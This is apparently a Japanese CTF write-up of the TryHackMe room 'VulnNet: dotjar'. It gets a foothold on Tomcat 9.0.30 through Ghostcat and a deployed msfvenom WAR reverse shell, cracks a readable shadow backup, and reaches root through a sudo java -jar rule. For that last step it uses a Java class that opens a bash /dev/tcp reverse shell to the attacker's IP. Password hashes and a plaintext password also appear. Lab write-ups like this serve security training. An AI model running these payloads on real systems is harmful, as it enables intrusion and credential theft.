# VulnNet: dotjar CTF

https://tryhackme.com/room/vulnnetdotjar

## Enumeration

```shell
TARGET=10.201.68.71
sudo bash -c "echo $TARGET   vulnnet.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 61
8009/tcp open  ajp13      syn-ack ttl 61
8080/tcp open  http-proxy syn-ack ttl 61
```

```shell
sudo nmap -vv -sS -sV -p22,8009,8080 $TARGET

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   syn-ack ttl 64 Apache Jserv (Protocol v1.3)
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat 9.0.30
MAC Address: 16:FF:C0:18:B9:05 (Unknown)
```

SSH, Jserv, HTTP  
8080ポートは `Apache Tomcat/9.0.30`のデフォルトページ

### ディレクトリ列挙

```sh
dirb http://$TARGET:8080

---- Scanning URL: http://10.201.68.71:8080/ ----
+ http://10.201.68.71:8080/docs (CODE:302|SIZE:0)                                                                                        
+ http://10.201.68.71:8080/examples (CODE:302|SIZE:0)                                                                                    
+ http://10.201.68.71:8080/favicon.ico (CODE:200|SIZE:21630)                                                                             
+ http://10.201.68.71:8080/host-manager (CODE:302|SIZE:0)                                                                                
+ http://10.201.68.71:8080/manager (CODE:302|SIZE:0) 
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://$TARGET:8080 -w ./dirlist.txt -t 64 -k
```

```sh
ffuf -u http://vulnnet.thm:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

何も出ない。

## Ghostcat

Tomcat 9.0.30 でググると、Metasploitのエクスプロイトがあった。

```sh
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS vulnnet.thm
RHOSTS => vulnnet.thm
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.201.68.71
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:[REDACTED]
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
[+] 10.201.68.71:8009 - File contents save to: /home/kali/.msf4/loot/20250824090755_default_10.201.68.71_WEBINFweb.xml_100890.txt
[*] Auxiliary module execution completed
```

この認証情報を使い、Server Status, Host Manager にはアクセスできるが、Manager Appにはアクセスできない。GUIアクセスが禁止されていると書かれているので、CUIでアクセスする。

リスト。隠しアプリのようなものは見つからない。

```sh
$ curl -u 'webdev:[REDACTED]' http://vulnnet.thm:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:examples
/host-manager:running:1:host-manager
/manager:running:0:manager
/docs:running:0:docs
```

warリバースシェルを作成

```sh
$ msfvenom -p java/shell_reverse_tcp LHOST=10.11.146.32 LPORT=4443 -f war -o shell.war
Payload size: 13031 bytes
Final size of war file: 13031 bytes
Saved as: shell.war
```

デプロイ

```sh
$ curl -u 'webdev:[REDACTED]' --upload-file shell.war "http://vulnnet.thm:8080/manager/text/deploy?path=/&update=true"
OK - Deployed application at context path [/]
```

http://vulnnet.thm:8080/shell.war にアクセス

シェル取得成功

```sh
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/shell_reverse_tcp
payload => java/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.146.32
LHOST => 10.11.146.32
msf6 exploit(multi/handler) > set LPORT 4443
LPORT => 4443
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.11.146.32:4443 
[*] Command shell session 1 opened (10.11.146.32:4443 -> 10.201.70.236:57936) at 2025-08-24 09:55:42 +0900

msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

id
uid=1001(web) gid=1001(web) groups=1001(web)
```

## 権限昇格１

手作業で一通りチェックしたが何も見つからなかった。

linpeas

/var/backups/shadow-backup-alt.gz を読めることを発見。

```sh
web@ip-10-201-70-236:~$ cp /var/backups/shadow-backup-alt.gz ./
cp /var/backups/shadow-backup-alt.gz ./
web@ip-10-201-70-236:~$ gunzip ./shadow-backup-alt.gz                               
gunzip ./shadow-backup-alt.gz
web@ip-10-201-70-236:~$ ls
ls
apache-tomcat-9.0.30  linpeas.sh  shadow-backup-alt
web@ip-10-201-70-236:~$ cat shadow-backup-alt
cat shadow-backup-alt
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
（中略）
jdk-admin:$6$PQQ[REDACTED]:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
```

hashcat で、jdk-admin のパスワードをクラックできた。  

```sh
.\hashcat.exe -m 1800 hash.txt rockyou.txt
```

su でユーザー変更し、user.txt 入手。

## 権限昇格２

sudoで任意のjarを実行可能。

```sh
jdk-admin@ip-10-201-70-236:~$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 794613852

Matching Defaults entries for jdk-admin on ip-10-201-70-236:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on ip-10-201-70-236:
    (root) /usr/bin/java -jar *.jar
```

shell.java

```java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.11.146.32/6666 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

マニフェスト。改行が必要な点に注意。

```sh
$ cat manifest.txt                 
Main-Class: shell
```

```sh
jdk-admin@ip-10-201-70-236:~$ javac shell.java

jdk-admin@ip-10-201-70-236:~$ jar cfm shell.jar manifest.txt shell.class
jar cfm shell.jar manifest.txt shell.class
jdk-admin@ip-10-201-70-236:~$ ls
ls
Desktop    Downloads     Music     Public       shell.jar   Templates  Videos
Documents  manifest.txt  Pictures  shell.class  shell.java  user.txt
```

rootシェル取得成功！

```sh
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.70.236] 56762
root@ip-10-201-70-236:/home/jdk-admin# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- tomcat の manager CUI で war をデプロイする手順は勉強になった。
- linpeas を使う前に、/var/backups に気づきたかった。権限昇格の手順を修正した。
